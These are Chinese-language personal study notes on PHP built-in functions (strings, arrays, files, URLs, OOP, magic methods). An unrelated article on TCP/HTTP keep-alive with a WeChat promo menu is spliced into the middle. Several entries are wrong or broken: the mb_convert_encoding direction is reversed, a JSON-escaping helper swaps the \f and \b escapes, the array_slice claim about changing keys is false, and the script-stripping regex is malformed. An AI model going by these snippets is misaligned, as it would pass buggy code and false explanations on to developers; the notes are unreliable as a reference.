++++++base64_encode()++++++
string base64_encode(string data)
将字符串以64位进行编码，可以让中文字或者图片也能在网络上顺利传输。

++++++get_loaded_extensions()++++++
这是查看php开启的扩展，输出的一个数组元素。

++++++setlocale() ++++++
函数设置地区信息（地域信息）。
设置地区为 US English，然后重新设置回系统默认：
<?php
echo setlocale(LC_ALL,"US");
echo "<br>";
echo setlocale(LC_ALL,NULL);
?>

++++++connection_aborted()来判断用户是否中断+++++++
error_reporting(E_ALL);  //显示报错信息  
var_dump(connection_status());   //显示用户的连接状态  
sleep(1);     //等待1秒  
if(connection_aborted()) die('连接中断');     //如果用户连接中断，停止运行  
echo "保持连接";  
ob_flush();       //存在输出缓存中的内容取出来，设置为等待输出状态  
flush();          //将等待输出缓存中内容，传给用户    
//记录时间，以查看是否已经运行  
$aaa = fopen("test.txt","a+");  
fwrite($aaa, date("Y-m-d H:i:s")."\n");  
fclose($aaa);  


++++++parse_str()函数++++++
将字符串解析成变量	
parse_str("id=23&name=John%20Adams",$myArray);
print_r($myArray);
结果为：
Array ( [id] => 23 [name] => John Adams )

++++++chr()函数++++++
返回指定ASCII值对应的字符
echo chr(077);
结果为：?

++++++ord()函数++++++
返回字符串对应的ASCII值
echo ord('H');
结果为：72

+++strpbrk()函数+++++++++
该函数返回指定字符第一次出现的位置开始的剩余部分，如果失败，返回false。
echo strpbrk('i love hz','ve');
结果是：
ve hz

++++exif_imagetype()函数++++++
exif_imagetype判断一个图像的类型
if (exif_imagetype("image.gif") != IMAGETYPE_GIF) {  
    echo "The picture is not a gif";  
}  
if (in_array(exif_imagetype("path/to/file"), array(IMAGETYPE_GIF , IMAGETYPE_JPEG ,IMAGETYPE_PNG , IMAGETYPE_BMP))) {  
    echo "This is a picture ";  
}  


+++++echo()函数+++++++
//PHP是先连接字符串再进行加法计算了.按照从左向右的方向进行的。
//如果将一个字符串强制转换成一个数字.PHP会去搜索这个字符串的开头.如果开头是数字就转换.如果不是就直接返回0

echo '5+1=' . 1+5;  //输出10
echo '5+1=' . 5+1;  //输出6
echo '5+1=' , 1+5;  //输出5+1=6
echo '5+1=' , 5+1;  //输出5+1=6

++++++strtr()函数+++++++  效果相当于str_replace()
该函数替换原字符串中出现过的所有相同元素。
echo strtr("Hilla Warld","ia","eo");
结果是：
Hello World; (strtr 将字符串中出现的所有i替换成e,a替换成o)

+++++++++str_replace()函数与preg_replace()函数+++++++++
str_replace(修改后的内容，希望替换的内容，原字符串或数组，替换的数目);
<?php
$arr = array("blue","red","green","yellow");
print_r(str_replace("red","pink",$arr,$i));
echo "替换数：$i";
?>
结果为：
Array ( [0] => blue [1] => pink [2] => green [3] => yellow ) 替换数：1
同样功能的函数有preg_replace()函数
preg_replace(修改后的内容，希望替换的内容，原字符串或数组）
转义字符串，json中常用。php5.2有一个系统函数json_encode()自带转义效果
public function escapeJsonString($value) {
    $escapers = array("\\", "/", "\"", "\n", "\r", "\t", "\x08", "\x0c");
    $replacements = array("\\\\", "\\/", "\\\"", "\\n", "\\r", "\\t", "\\f", "\\b");
    $result = str_replace($escapers, $replacements, $value);
    return $result;
}

++++++PHP寻找两个字符串的相似性similar_text()+++++++
PHP 提供了一个极少使用的 similar_text 函数，但此函数非常有用，用于比较两个字符串并返回相似程度的百分比
similar_text($string1, $string2, $percent);
实例：
similar_text('hhllo','hello',$percent);
echo $percent."%";
结果为：80%

++++++htmlspecialchars()函数++++++++
echo htmlspecialchars($str, ENT_COMPAT); // 只转换双引号
echo "<br>";
echo htmlspecialchars($str, ENT_QUOTES); // 转换双引号和单引号  ，更加安全


++++bin2hex()函数++++++++++
bin2hex 将二进位转成十六进位
语法：string bin2hex(string str);

+++++++strip_tags()函数+++++++++
strip_tags()函数去除 剥去 HTML、XML 以及 PHP 的标签。
<?php
echo strip_tags("Hello <b>NowaMagic!</b>");
?>
结果为：
Hello NowaMagic!


+++++++++++ mb_convert_encoding()函数++++++++
mb_convert_encoding($str,'UTF-8','GBK')；将UTF-8格式的转为GBK
另外一个转码函数iconv()函数：
发现iconv在转换字符”—”到gb2312时会出错，如果没有ignore参数，所有该字符后面的字符串都无法被保存。
不管怎么样，这个”—”都无法转换成功，无法输出。 另外mb_convert_encoding没有这个bug. 
一般情况下用 iconv，只有当遇到无法确定原编码是何种编码，或者iconv转化后无法正常显示时才用mb_convert_encoding 函数. 
$content = iconv("GBK", "UTF-8", $str); (以上俩个函数会产生同样效果)
在使用iconv()时候，请不要转成"GB2312"的格式，因为这是iconv的一个bug，可以直接把gb2312写成gbk就OK了。

++++++++ stream_context_create()++++++++
作用：创建并返回一个文本数据流并应用各种选项，可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程。 
函数原型：resource stream_context_create ([ array $options [, array $params ]] ) 
function Post($url, $post = null){
     $context = array();
     if (is_array($post)) {
         ksort($post);
         $context['http'] = array (
             'timeout'=>60,
             'method' => 'POST',
             'content' => http_build_query($post, '', '&'),
         );
     }
return file_get_contents($url, false,stream_context_create($context));
}

$data = array(
     'name' => 'test',
     'email' => 'test@gmail.com',
     'submit' => 'submit',
);
$str=Post('http://www.ej38.com', $data);
echo mb_convert_encoding($str,'UTF-8','GBK');

+++++++http_build_query()函数+++++++
将数组返回成一个url格式字符串
$data = array('foo'=>'bar',
              'baz'=>'boom',
              'cow'=>'milk',
              'php'=>'hypertext processor'
             );
echo http_build_query($data);
结果为：
foo=bar&baz=boom&cow=milk&php=hypertext+processor

+++++strstr()函数++++++++
检测一个字符串是否存在另一个字符串中，如果存在则返回检测原样（不加true）或者返回剩下部分
echo strstr('Hello','o');      返回 o
echo strstr('Hello','o',true); 返回 Hell
echo strstr('Hello','22');     不返回任何内容

+++++array_unique()函数+++++++
array_unique()可以去除一个一维数组中相同的元素，但是它不适用于多维数组，下面的方法可以解决。
function array_unique_fb($array2D)
{
    foreach ($array2D as $v)
    {
        $v = join(",",$v);  //降维,也可以用implode,将一维数组转换为用逗号连接的字符串
        $temp[] = $v;
    }
    $temp = array_unique($temp);    //去掉重复的字符串,也就是重复的一维数组
    foreach ($temp as $k => $v)
    {
        $temp[$k] = explode(",",$v);   //再将拆开的数组重新组装
    }
    return $temp;
}


+++++++str_repeat()函数+++++++
重复字符串：
$arr='12';
echo str_repeat($arr,4);
结果为：
12121212


++++str_word_count()函数+++++++++++++
str_word_count()函数，可以确定一个字符串中某个单词的出现次数。
$arr='gg rfg rghh ';
var_dump(str_word_count($arr,1,'g'));
结果为：
array (size=3)
  0 => string 'gg' (length=2)
  1 => string 'rfg' (length=3)
  2 => string 'rghh' (length=4)


++++++++substr_count()函数++++++++++++
substr_count()函数：可以确定一个字符串在所提供的字符串中有多少个
$arr="fghyjffgyhjdsthshgvgfhds";
var_dump(substr_count($arr,'g'));
结果为：
int 4


+++++++array_flip()函数++++++++++
交换键名与键值
$arr=array('1'=>'a','2'=>'b','3'=>'c');
var_dump(array_flip($arr));
结果为：array (size=3)
  'a' => int 1
  'b' => int 2
  'c' => int 3


++++++array_key_exists()与in_array()函数+++++++
检查值、键：
array_key_exists($key,$array);//检查数组键
in_array($value,$array);//检查值于数组


++++++++array_slice()函数+++++++++
array_slice()函数
$arr=array(1=>'ffd',2=>'tgrt',3=>'rghd',4=>'erhh',5=>'fffsv');
var_dump(array_slice($arr,1,1));
结果是：
array (size=1)
0 => string 'tgrt' (length=4)
array_splice()函数
$arr=array(1=>'ffd',2=>'tgrt',3=>'rghd',4=>'erhh',5=>'fffsv');
array_splice($arr,4);
var_dump($arr);
结果是：
array (size=4)
  0 => string 'ffd' (length=3)
  1 => string 'tgrt' (length=4)
  2 => string 'rghd' (length=4)
  3 => string 'erhh' (length=4)

array_change_key_case()	返回其键均为大写或小写的数组。 	
array_chunk()	把一个数组分割为新的数组块。	
array_combine()	通过合并两个数组来创建一个新数组。	
array_count_values()	用于统计数组中所有值出现的次数。	
array_diff()	返回两个数组的差集数组。	
array_diff_assoc()	比较键名和键值，并返回两个数组的差集数组。	
array_diff_key()	比较键名，并返回两个数组的差集数组。	
array_diff_uassoc()	通过用户提供的回调函数做索引检查来计算数组的差集。	
array_diff_ukey()	用回调函数对键名比较计算数组的差集。	
array_fill()	用给定的值填充数组。	
array_filter()	用回调函数过滤数组中的元素。	
array_flip()	交换数组中的键和值。	
array_intersect()	计算数组的交集。	
array_intersect_assoc()	比较键名和键值，并返回两个数组的交集数组。	
array_intersect_key()	使用键名比较计算数组的交集。	
array_intersect_uassoc()	带索引检查计算数组的交集，用回调函数比较索引。	
array_intersect_ukey()	用回调函数比较键名来计算数组的交集。	
array_key_exists()	检查给定的键名或索引是否存在于数组中。	
array_keys()	返回数组中所有的键名。	
array_map()	将回调函数作用到给定数组的单元上。	
array_merge()	把一个或多个数组合并为一个数组。	
array_merge_recursive()	递归地合并一个或多个数组。	
array_multisort()	对多个数组或多维数组进行排序。	
array_pad()	用值将数组填补到指定长度。	
array_pop()	将数组最后一个单元弹出（出栈）。	
array_product()	计算数组中所有值的乘积。	
array_push()	将一个或多个单元（元素）压入数组的末尾（入栈）。	
array_rand()	从数组中随机选出一个或多个元素，并返回。	
array_reduce()	用回调函数迭代地将数组简化为单一的值。	
array_reverse()	将原数组中的元素顺序翻转，创建新的数组并返回。	
array_search()	在数组中搜索给定的值，如果成功则返回相应的键名。
array_shift()	删除数组中的第一个元素，并返回被删除元素的值。	
array_slice()	在数组中根据条件取出一段值，并返回。	
array_splice()	把数组中的一部分去掉并用其它值取代。	
array_sum()	计算数组中所有值的和。	
array_udiff()	用回调函数比较数据来计算数组的差集。	
array_udiff_assoc()	带索引检查计算数组的差集，用回调函数比较数据。
array_udiff_uassoc()	带索引检查计算数组的差集，用回调函数比较数据和索引。	
array_uintersect()	计算数组的交集，用回调函数比较数据。	
array_uintersect_assoc()	带索引检查计算数组的交集，用回调函数比较数据。	
array_uintersect_uassoc()	带索引检查计算数组的交集，用回调函数比较数据和索引。	
array_unique()	删除数组中重复的值。	
array_unshift()	在数组开头插入一个或多个元素。	
array_values()	返回数组中所有的值。	
array_walk()	对数组中的每个成员应用用户函数。	
array_walk_recursive()	对数组中的每个成员递归地应用用户函数。	
arsort()	对数组进行逆向排序并保持索引关系。	
asort()	对数组进行排序并保持索引关系。	
compact()	建立一个数组，包括变量名和它们的值。	
count()	计算数组中的元素数目或对象中的属性个数。	
current()	返回数组中的当前元素。	
each()	返回数组中当前的键／值对并将数组指针向前移动一步。	
end()	将数组的内部指针指向最后一个元素。	
extract()	从数组中将变量导入到当前的符号表。	
in_array()	检查数组中是否存在指定的值。	
key()	从关联数组中取得键名。	
krsort()	对数组按照键名逆向排序。	
ksort()	对数组按照键名排序。	
list()	把数组中的值赋给一些变量。	
natcasesort()	用“自然排序”算法对数组进行不区分大小写字母的排序。	
natsort()	用“自然排序”算法对数组排序。	
next()	将数组中的内部指针向前移动一位。	
pos()	current() 的别名。	
prev()	将数组的内部指针倒回一位。	
range()	建立一个包含指定范围的元素的数组。	
reset()	        将数组的内部指针指向第一个元素。	
rsort()	        对数组逆向排序。	
shuffle()	把数组中的元素按随机顺序重新排列。	
sizeof()	count() 的别名。	
sort()	        对数组排序。	
uasort()	使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。	
uksort()	使用用户自定义的比较函数对数组中的键名进行排序。	
usort()	使用用户自定义的比较函数对数组中的值进行排序。

PHP函数microtime()返回当前 Unix 时间戳和微秒数。

++++++++strpos()++++++++
在使用该函数的时候。里面的位置一定要分清楚，strpos(原字符串，“需要查找的字符串片段”);
谨记谨记谨记

 
++++++++strcmp()函数++++++++
比较两个字符串（区分大小写）：
<?php
echo strcmp("Hello world!","Hello world!");
?>


++++++++array_unique(array)函数++++++++
该函数用来移除数组中的重复的值，并返回结果数组。
当几个数组元素的值相等时，只保留第一个元素，其他的元素被删除。
返回的数组中键名不变。

++++++++call_user_func()++++++++
call_user_func('方法名称','赋的值'):一种特别的调用函数的方法，例如；
function nowmagic($a)
{
 echo $a;
}
call_user_func('nowmagic','1111111111');

++++++++preg_replace_callback()++++++++
preg_replace_callback()正则替换回调函数;

++++++++array_unshift()++++++++
array_unshift() 函数在数组开头插入一个或多个元素。例如：
$a=array('11','22','33');
array_unshift($a,'66');
结果为：66,11,22,33

++++++++is_numeric()++++++++
is_numeric()检测变量是否为数字或数字字符串;如果是返回true,不是返回false;

++++++++strpos()++++++++
stripos()与strpos(),前者对大小写不敏感，后者则敏感，类似的还有str_ireplace()与str_replace()

++++++++array_filter()++++++++
array_filter(array,function);筛选出需要的结果
function myfudction($v)
{
if($v=="H")
{
  return true;
}
return false;
}
$as=array("H","d","s");
print_r(array_filter($as,"myfudction"));

+++++++array_intersect()+++++++
array_intersect() 函数返回两个或多个数组的交集数组。
$add1=array(1,3,4,5);
$add2=array(3,4,6,7);
print_r(array_intersect($add1,$add2));
结果是：
Array ( [1] => 3 [2] => 4 ) 

+++++++++join()+++++++++
join() 函数返回由数组元素组合成的字符串。
join() 函数是 implode() 函数的别名。也就是说它也是把数组元素练成一段字符串

+++++++面向对象：parent::关键字++++++++
parent::用来引用父类中的方法。
class employee
{
protected $sal=3000;
public function getSal()
{
 return $this->sal;
}
}
class manager extends employee
{
   public function getSal()
   {
   parent::getSal();
$this->sal=$this->sal+2000;
return $this->sal;
    }
}
$emp=new employee();
echo $emp->getSal()."<br>";
$mana=new manager();
echo $mana->getSal();


++++++++这里的$name可以直接用$this->name调用+++++++++
class Person
{
var $name;
var $age;
function say()
	{
	echo "my name is :".$this->name."<br>";
	echo "my age is :".$this->age."<br>";
    }
}
class Student extends Person
{
	var $school;
	function study()
	{
	echo "my name is:".$this->name."<br>";
	echo "i am".$this->school."study";
	}
}
$stu=new Student();
$stu->name="Bob";
$stu->age="Tom";
$stu->school="People";
$stu->study();

+++++php构造函数与析构函数+++++
__construct()构造函数与__destruct()析构函数，前者是在一个类被实例化之前先被自动调用，无返回值，后者则是在销毁一个类之前自动执行一些东西，即两个的执行时间不一样，其他的区别不大。
final 关键字用于定义类和方法，该关键字表示该类或方法为最终版本，即该类不能被继承，或该方法在子类中不能被重载（覆盖）。


echo $HTTP_COOKIE_VARS["TestCookie"]; 输出所有cookie值。

+++++++mktime()++++++
mktime()函数适合用来进行日期计算和校验，设定一个固定日期。
echo date('Y-m-d H:i:s',mktime(0,0,0,12,30,1997));  //输出1997-12-30 00:00:00
echo date('Y-m-d H:i:s',mktime(0,0,0,12,32,1997));  //输出1998-01-01 00:00:00



TCP / IP长连接&连接池的应用
我们知道TCP是基于连接的协议，其实这个“连接”只是一个逻辑上的概念。在IP层看来， TCP和UDP仅仅是内容上稍有差别而已。
TCP的“连接”仅仅是连接的两端对于四元组和sequence号的一种约定而已。
在有些文章里总会提到这名词、或者五元组，甚至七元组。虽然我很反对摆弄名词秀专业，但我们也要防止被“秀”。 其实很容易理解：
四元组： 源IP地址、目的IP地址、源端口、目的端口
五元组： 源IP地址、目的IP地址、协议、源端口、目的端口
七元组： 源IP地址、目的IP地址、协议、源端口、目的端口，服务类型，接口索引
在性能比较敏感的程序中，为了节省TCP网络调用建立连接三次握手的时间， 很多程序都会选择采用复用之前已经建立过的连接的方法来优化。
再加上往往是“请求、响应、请求、响应”的模式，单个连接限制了QPS（Query Per Second）的提升。 所以会采取开启多个连接组成一个“池子”的方式来优化性能，我们称之为连接池。
HTTP的长连接
HTTP长连接，HTTP持久连接（HTTPpersistent connection，也称作HTTP keep-alive或HTTP connection reuse）是使用同一个TCP连接来发送和接收多个HTTP请求/应答， 而不是为每一个新的请求/应答打开新的连接的方法。
在HTTP 1.0 中, 没有官方的 keepalive 的操作。通常是在现有协议上添加一个指数。如果浏览器支持 keep-alive，它会在请求的包头中添加：
Connection: Keep-Alive
然后当服务器收到请求，作出回应的时候，它也添加一个头在响应中：
Connection: Keep-Alive
这样做，连接就不会中断，而是保持连接。当客户端发送另一个请求时，它会使用同一个连接。这一直继续到客户端或服务器端认为会话已经结束，其中一方中断连接。
在HTTP 1.1 中 所有的连接默认都是持续连接，除非特殊声明不支持。 HTTP 持久连接不使用独立的 keepalive 信息，而是仅仅允许多个请求使用单个连接。
然而，Apache 2.0 httpd 的默认连接过期时间是仅仅15秒，对于 Apache 2.2 只有5秒。 短的过期时间的优点是能够快速的传输多个web页组件，而不会绑定多个服务器进程或线程太长时间。
loading...
Keep-Alive的优势
较少的CPU和内存的使用（由于同时打开的连接的减少了）
允许请求和应答的HTTP管线化
减少了后续请求的延迟（无需再进行握手）
报告错误无需关闭TCP连接
Keep-Alive的劣势
对于现在的广泛普及的宽带连接来说，Keep-Alive也许并不像以前一样有用。 web服务器会保持连接若干秒(Apache中默认15秒)，这与提高的性能相比也许会影响性能。对于单个文件被不断请求的服务(例如图片存放网站)，Keep-Alive可能会极大的影响性能， 因为它在文件被请求之后还保持了不必要的连接很长时间。
根据RFC2616，用户客户端与任何服务器和代理服务器之间不应该维持超过2个链接。代理服务器应该最多使用2×N个持久连接到其他服务器或代理服务器，其中N是同时活跃的用户数。这个指引旨在提高HTTP响应时间并避免阻塞。
但由于，TCP连接减少了，对于静态资源（图片、JavaScript、CSS）较多的网站， 性能反而可能会下降。
动静分离
为了规避上面说的对图片等静态资源的影响，大多数商业网站会启用独立的静态资源域名。从而保证主站的动态资源请求和静态资源的请求不会互相挤占连接。
动静分离同时还会有一个额外的好处：
对于静态资源的请求，HTTP请求头里的Cookie等信息是没有用处的， 反而占用了宝贵的上行网络资源。用独立的域名存放静态资源后，请求静态资源域名就不会默认带上主站域的Cookie，从而解决了这个问题。
如下表：
loading...
一、IT技术文章：
回复"1",查看——“ 如何深入了解linux”
回复"2",查看——“Python 自动化框架”
回复"3",查看——“ Linux 运维职业规划”
回复"4",查看——“提升B格的命令技巧”
回复"5",查看——“网络编程-从Apache到Nginx”
回复"6",查看——“两个使用的Python 装饰器
回复"7",查看——“Python 多线程、进程那些事”
回复"8",查看——“1000，000 packets/s的挑战”
回复"9",查看——“Op危机，你嗅到了没？”
回复"10",查看——“干货丨戏说非阻塞网络编程”
回复"11",查看——“用Python写一个简单的监控系统”
回复"12",查看——“提高你Python 编码效率的‘武林秘籍’”
二、最新课程：
回复"课程",查看——最新课程消息
回复"报名"，查看——报名咨询方式
回复"Reboot",查看——Reboot简介


strstr就等于strchr，但是它们和strrchr不一样！
strstr和strrchr的区别
strstr 显示第一次找到，要查找的字符串，以及后面的字符串。 
strrchr 显示最后一次找到，要查找的字符串，以及后面的字符串。
<?php 
$email = 'test@test.com@jb51.net'; 
$domain = strstr($email, '@'); 
echo "strstr 测试结果 $domain<br>"; 
$domain = strrchr($email, '@'); 
echo "strrchr 测试结果 $domain<br>"; 
?>
结果如下：
strstr 测试结果 @test.com@jb51.net 
strrchr 测试结果 @jb51.net

substr用法：
<?php $email = 'zhangYingy@jb51.net'; 
$domain = substr($email, 6); 
echo "substr 测试结果 $domain<br>"; 
?>
echo substr('123456',1); //23456
echo substr('123456',1,2);//23
echo substr('123456',1,-2); //234
结果如下：
substr 测试结果 ingy@jb51.net

+++++++++php默认变量+++++++++
echo __FILE__;//这是文件完整的地址为：D:\wamp\wamp\apps\think\test.php
echo __LINE__;//显示这一句所在的行数
echo PHP_VERSION;//显示php版本
echo PHP_OS; //显示php运行系统名称
echo TRUE;  //1,同理FALSE结果为0
echo E_ERROR;
echo "<br>";
//可以用define函数自定义默认变量
define('COPYRIGHT','Copyright');
echo COPYRIGHT;

$testa=array('0'=>array('id'=>14),'1'=>array('id'=>23),'3'=>array('id'=>32));
array_slice($testa,1-1,'id');
var_dump($testa);exit;
用array_slice()可以更换数组的键名，不过如果键名相同，数组会自动添加新的键名，结果会是这样；
array (size=3)
  0 => 
    array (size=1)
      'id' => int 14
  1 => 
    array (size=1)
      'id' => int 23
  3 => 
    array (size=1)
      'id' => int 32


+++++++urlencode()函数+++++++
本函数将字符串以 URL 编码。例如空格就会变成加号。
Homepage 中 form 资料传送就是用 urlencode 编码后再送出。

bool array_walk ( array &array, callback funcname [, mixed userdata] ) 对数组中的每个成员应用用户函数
array array_map ( callback callback, array arr1 [, array ...] )将回调函数作用到给定数组的单元上
array array_fill ( int start_index, int num, mixed value ) 用给定的值填充数组
array_fill(5, 3, 'a')-->array(5=>'a',6=>'a',7=>'a')
array array_chunk ( array input, int size [, bool preserve_keys] )将一个数组分割成多个


++++++array_multisort()这个函数+++++++
有时候我们需要对二维数组的某个键的值进行排序，这里就是讨论这个问题。
我们可以使用array_multisort()这个函数。array_multisort() 函数对多个数组或多维数组进行排序。

++++++list() 函数:+++++++
list() 函数用数组中的元素为一组变量赋值。
注意，与 array() 类似，list() 实际上是一种语言结构，不是函数。
<?php
	$my_array = array("Dog","Cat","Horse");
	list($a, , $c) = $my_array;
	echo "Here I only use the $a and $c variables.";
?>  
运行结果： Here I only use the Dog and Horse variables.

+++++++number_format() 函数:+++++++
number_format() 函数通过千位分组来格式化数字。
<?php
$num = 500000;
echo number_format($num);
// 500,000
echo number_format($num, 2);
// 500,000.00
echo number_format($num, 3, ".", ",");
// 500,000.000
?>

+++++php5常用函数++++++
    connection_status() 函数返回当前的连接状态。
　　connection_aborted() 函数检查是否断开客户机。
　　zip_read() 函数读取打开的 zip 档案中的下一个文件。
　　zip_open() 函数打开 ZIP 文件以供读取。
　　zip_entry_read() 函数从打开的 zip 档案项目中获取内容。
　　zip_entry_open() 函数打开一个 ZIP 档案项目以供读取。
　　PHP5常用函数之zip_entry_name() 函数返回 zip 档案项目的名称。
　　zip_entry_filesize() 函数返回 zip 档案项目的原始大小(在压缩之前)。
　　zip_entry_compressionmethod() 函数返回 zip 档案项目的压缩方法。
　　zip_entry_compressedsize() 函数返回 zip 档案项目的压缩文件尺寸。
　　zip_entry_close() 函数关闭由 zip_entry_open() 函数打开的 zip 档案文件。
　　zip_close() 函数关闭由 zip_open() 函数打开的 zip 档案文件。
    file_exists($file)    判断文件是否存在
    gettype();            获取数据类型

+++++++++file_put_contents()函数+++++++++
file_put_contents(文件名，要加的内容，) 函数把一个字符串写入文件中。
与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。
而file_put_contents(,,FILE_APPEND)则是追加效果，适合用来写日志文件。

	
++++$_SERVER['HTTP_REFERER']++++++
<?php echo $_SERVER['HTTP_REFERER'];?>可以得到链接/提交当前页的父页面URL
如果返回“找不到文件”的提示，则可用 header 函数，header("HTTP/1.0 404 Not Found").
写出一个正则表达式，过虑网页上的所有JS/VBS脚本（即把标记及其内容都去掉）.
/<[^>].*?>.*?<\/>/si


++++php数组中对键名与键值的操作+++++++
arra_keys()获得数组键名
$arr=array('1'=>'gg','2'=>'sd','3'=>'rg');
$ee=array_keys($arr);
var_dump($ee);
结果为：
array (size=3)
  0 => int 1
  1 => int 2
  2 => int 3
array_values()获得数组键值
$arr=array('1'=>'gg','2'=>'sd','3'=>'rg');
$ee=array_values($arr);
var_dump($ee);
结果为：
array (size=3)
  0 => string 'gg' (length=2)
  1 => string 'sd' (length=2)
  2 => string 'rg' (length=2)


+++++++++parse_url()函数:+++++++++
parse_url() 函数可以解析 URL，返回其组成部分。它的用法如下：
array = parse_url( string url );
<?php 
  $url="http://www.nowmagic.net/welcome/";
  $parts=parse_url($url);
  print_r($parts);
?>
结果是：Array ( [scheme] => http [host] => www.nowmagic.net [path] => /welcome/ )  ;


+++++++strip_tags()函数+++++++
strip_tags() 函数剥去 HTML、XML 以及 PHP 的标签
<?php
echo strip_tags("Hello <b>NowaMagic!</b>");
?>
结果是：Hello NowaMagic!


+++++shuffle()函数+++++++++
将数组随机打乱
<?php 
  $data=array('111','222','333','444','555','666');
  shuffle($data);
  print_r($data);
  结果是：Array ( [0] => 222 [1] => 555 [2] => 333 [3] => 111 [4] => 444 [5] => 666 ) 
?>

++++++http_bluid_query()函数++++++
将数组变成url
<?php 
  $data = array(
   'site'=>'www.nowamagic.net', 
	'foo'=>'bar', 
	'baz'=>'boom', 	
	'name'=>'nowamagic'); 
  echo http_build_query($data); 
?>
结果为：site=www.nowamagic.net&foo=bar&baz=boom&name=nowamagic

++++++stream_context_create()函数+++++++
stream_context_create() 作用：创建并返回一个文本数据流并应用各种选项，
可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程。

++++++++++查看本地目录之glob()和scandir()+++++++++
glob()函数
$img=array('gif','png','jpg');
$dir='img/';  //查找的文件名所在目录
$pic=array();
foreach($img as $k=>$v){
	$pattern=$dir.'*.'.$v;
	$all=glob($pattern);
	$pic=array_merge($pic,$all);
}
var_dump($pic);
foreach($pic as $p){
echo $p.'<br>';
}
上面的等同于：
$files=glob('img/*.jpg');
print_r($files);
结果均为：
array (size=2)
  0 => string 'img/test.jpg' (length=12)
  1 => string 'img/test2.jpg' (length=13)

scandir()函数：
$dir='img/';
$file=scandir($dir);
print_r($file);
结果为：
Array ( [0] => . [1] => .. [2] => test.jpg [3] => test2.jpg ) 


+++++++++数组比较函数 array_diff()与array_diff_assoc()函数+++++++
array_diff_assoc() 函数返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的键和值。
和 array_diff()函数不同，本函数要求键名和键值都进行比较。返回的数组中键名保持不变。
array_diff() 能比较key和value，而实际上它只比较了value，而不关心key，如果关心key的话，可以使用函数array_diff_assoc().

++++++++php数组求交集的array_intersect()函数与array_intersecct_assoc()函数：++++++++++
array_intersect        计算数组的交集，只关心value，不关心key；
array_intersect_assoc  带索引检查计算数组的交集。


json_encode()与json_decode()
这是PHP的原生函数，然而在今天JSON越来越流行，所以在PHP5.2以后，
PHP开始支持JSON，你可以使用 json_encode() 和 json_decode() 函数

filectime — 取得文件的 inode 修改时间
filemtime — 取得文件修改时间
fileatime — 取得文件上次访问时间
fileperms -- 取得文件的访问权限
is_executable — 判断给定文件名是否可执行



++++++get_headers()函数++++++++++
get_headers()获取所有的，由服务器发送的响应一个HTTP请求的头信息
$url='http://www.example.com';
print_r(get_headers($url));
结果为：
Array(
 [0] => HTTP/1.1 200 OK 
 [1] => Date: Sat, 29 May 2004 12:28:13 GMT 
 [2] => Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)
 [3] => Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
 [4] => ETag: "3f80f-1b6-3e1cb03b"
 [5] => Accept-Ranges: bytes
 [6] => Content-Length: 438
 [7] => Connection: close
 [8] => Content-Type: text/html 
) 


++++++php魔幻方法+++++++
php规定以两个下划线（__）开头的方法都保留为魔术方法，所以建议大家函数名最好不用__开头，除非是为了重载已有的魔术方法。  
PHP中的魔术方法有 :__construct, __destruct , __call, __callStatic,__get, __set, __isset, __unset , __sleep, __wakeup, __toString, __set_state, __clone, __autoload  
1、__get、__set  
这两个方法是为在类和他们的父类中没有声明的属性而设计的  
__get( $property ) 当调用一个未定义的属性时，此方法会被触发，传递的参数是被访问的属性名  
__set( $property, $value ) 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值  
这里的没有声明包括当使用对象调用时，访问控制为proteced,private的属性（即没有权限访问的属性）。  
2、__isset、__unset  
__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法  
__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法  
与__get方法和__set方法相同，这里的没有声明包括当使用对象调用时，访问控制为proteced,private的属性（即没有权限访问的属性）  
3、__call  
__call( $method, $arg_array ) 当调用一个未定义的方法是调用此方法  
这里的未定义的方法包括没有权限访问的方法；如果方法不存在就去父类中找这个方法，如果父类中也不存在就去调用本类的__call()方​法，如果本类中不存在__call()方法就去找父类中的__call()方法   
4、__autoload  
__autoload 函数，它会在试图使用尚未被定义的类时自动调用。通过调用此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。  
如果要定义一个全局的自动加载类，则必须用spl_autoload_register()方法将处理类注册到PHP标准库：  
<?php    
class Loader    
{    
static function autoload_class($class_name)    
{    
//寻找正确的$class_name类，并引入，没有则抛出异常    
}    
}    
/**
*   设置对象的自动载入 
*   spl_autoload_register — Register given function as __autoload() implementation 
*/    
spl_autoload_register(array('Loader', 'autoload_class'));    
    
$a = new Test();//Test没用require就实例化，实现自动加载，很多框架就用这种方法自动加载类    
    
?>    
注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误，所以应该在函数本身做捕获。  
5、__construct、__destruct  
__construct 构造方法，当一个对象创建时调用此方法，相对于PHP4使用此方法的好处是：可以使构造方法有一个独一无二的名称,无论它所在的类的名称是什么.这样你在改变类的名称时,就不需要改变构造方法的名称  
__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法。默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源，析构函数允许你在使用一个对象之后执行任意代码来清除内存。当PHP决定你的脚本不再与对象相关时,析构函数将被调用。  
在一个函数的命名空间内，这会发生在函数return的时候。  
对于全局变量,这发生于脚本结束的时候。  
如果你想明确地销毁一个对象,你可以给指向该对象的变量分配任何其它值.通常将变量赋值勤为NULL或者调用unset.  
6、__clone  
PHP5中的对象赋值是使用的引用赋值，如果想复制一个对象则需要使用clone方法，在调用此方法是对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。  
7、__toString  
__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时。  
如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in  
此方法必须返回一个字符串。  
在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）。从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。  
8、__sleep、__wakeup  
